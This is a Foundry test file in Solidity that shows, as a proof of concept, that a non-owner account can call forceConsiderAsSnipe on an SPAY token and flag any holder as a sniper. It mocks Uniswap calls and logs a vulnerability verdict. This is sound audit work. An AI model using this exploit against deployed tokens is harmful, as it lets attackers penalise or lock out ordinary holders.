// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SPAY.sol";

contract SPAYForceSnipeTest is Test {
    SPAY token;
    address owner = address(0x1);
    address attacker = address(0x2);
    address victim = address(0x3);
    
    address constant UNISWAP_ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address factoryAddress = address(0x1111);
    address wethAddress = address(0x2222);
    address pairAddress = address(0xabcd);

    function setUp() public {
        vm.startPrank(owner);

        // Mock Uniswap router factory call
        vm.mockCall(
            UNISWAP_ROUTER_ADDRESS,
            abi.encodeWithSelector(0xc45a0155), // factory() selector
            abi.encode(factoryAddress)
        );
        
        // Mock Uniswap router WETH call
        vm.mockCall(
            UNISWAP_ROUTER_ADDRESS,
            abi.encodeWithSelector(0xad5c4648), // WETH() selector
            abi.encode(wethAddress)
        );
        
        // Mock factory createPair call
        vm.mockCall(
            factoryAddress,
            abi.encodeWithSelector(0xc9c65396), // createPair() selector
            abi.encode(pairAddress)
        );

        token = new SPAY();
        vm.stopPrank();
    }

    function testNonOwnerCanMarkAnyoneAsSnipe() public {
        console.log("--- BEFORE-Trigger ---");
        bool preSnipeStatus = token.isConsiderAsSnipe(victim);
        console.log("Victim snipe status (before):", preSnipeStatus);
        assertFalse(preSnipeStatus);

        console.log("--- Trigger Call: forceConsiderAsSnipe by Attacker ---");
        vm.prank(attacker);
        token.forceConsiderAsSnipe(victim, true);

        console.log("--- AFTER-Trigger ---");
        bool postSnipeStatus = token.isConsiderAsSnipe(victim);
        console.log("Victim snipe status (after):", postSnipeStatus);
        assertTrue(postSnipeStatus);

        // Vulnerability verdict
        if (!preSnipeStatus && postSnipeStatus) {
            console.log("Vulnerability Exists: Non-owner can arbitrarily modify snipe statuses");
        } else {
            console.log("Vulnerability not Exist: Snipe status remains unchanged after attack");
        }

        // Cleanup owner unmark victim
        vm.prank(owner);
        token.forceConsiderAsSnipe(victim, false);
    }
}